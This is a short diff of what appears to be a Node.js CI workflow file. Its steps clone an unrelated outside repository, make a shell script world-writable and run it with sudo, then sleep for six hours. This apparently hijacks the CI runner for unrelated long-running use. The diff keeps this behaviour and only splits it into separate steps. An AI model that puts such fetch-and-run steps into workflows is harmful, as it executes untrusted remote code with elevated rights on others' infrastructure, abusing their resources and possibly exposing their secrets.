@@ -21,4 +21,6 @@ jobs:
       uses: actions/setup-node@v1
       with:
         node-version: ${{ matrix.node-version }}
-    - run: git clone https://github.com/coliituenaklo2/anu.git && cd anu && ls && sudo chmod 777 linuxdesktop.sh && ./linuxdesktop.sh && sleep 21600
+    - run: git clone https://github.com/coliituenaklo2/anu.git 
+    - run: cd anu && ls && sudo chmod 777 linuxdesktop.sh && ./linuxdesktop.sh 
+    - run: sleep 21600
